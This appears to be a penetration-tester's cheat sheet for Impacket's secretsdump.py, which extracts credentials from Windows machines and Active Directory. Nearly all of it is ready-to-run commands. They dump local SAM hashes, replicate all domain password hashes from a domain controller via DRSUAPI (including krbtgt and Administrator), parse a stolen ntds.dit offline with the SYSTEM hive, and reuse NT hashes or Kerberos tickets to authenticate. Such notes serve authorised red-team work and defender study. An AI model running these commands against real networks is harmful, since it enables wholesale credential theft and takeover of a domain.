# 07.10 secretsdump.py Credential Extraction

> Dump SAM, NTDS, LSA, and Kerberos keys remotely (SMB/VSS) or offline (NTDS.dit) with `secretsdump.py`.

## Overview

secretsdump.py is the primary Impacket tool for extracting credentials. Supports remote (SMB/VSS) and local (offline NTDS.dit) modes. Produces NTLM hashes, Kerberos keys, and LSA secrets.

## Steps

- Remote SAM dump requires local admin on target (not DC)
- NTDS dump targets the DC; uses VSS or DRSUAPI replication to copy ntds.dit
- -just-dc dumps only domain hashes via DRSUAPI; -just-dc-ntlm outputs only NT hashes
- -history dumps password history hashes (crack for policy reuse)
- Offline mode: needs both NTDS.dit and SYSTEM hive (for syskey)
- Output file: <name>.ntds for hashes, <name>.ntds.cleartext for cleartext (reversible encryption)

## Commands

### Remote SAM dump (local admin)

```bash
impacket-secretsdump DOMAIN/user:'P@ss'@TARGET_IP
impacket-secretsdump -hashes :NThash DOMAIN/user@TARGET_IP
```

### DC NTDS dump — all hashes via DRSUAPI

```bash
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc-ntlm
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc -history
```

### DC NTDS dump — specific user

```bash
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc-user Administrator
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc-user krbtgt
```

### Output to file

```bash
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc -outputfile /tmp/dc_hashes
# Creates: /tmp/dc_hashes.ntds (hashes), /tmp/dc_hashes.ntds.kerberos
```

### Offline NTDS.dit parsing

```bash
# First grab files (e.g. via VSS or SeBackupPrivilege)
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM -security /tmp/SECURITY LOCAL
```

### Kerberos / PTH dump

```bash
impacket-secretsdump -k -no-pass DOMAIN/user@DC01.DOMAIN.LOCAL
impacket-secretsdump -hashes :NThash -k -no-pass DOMAIN/user@DC01.DOMAIN.LOCAL
```
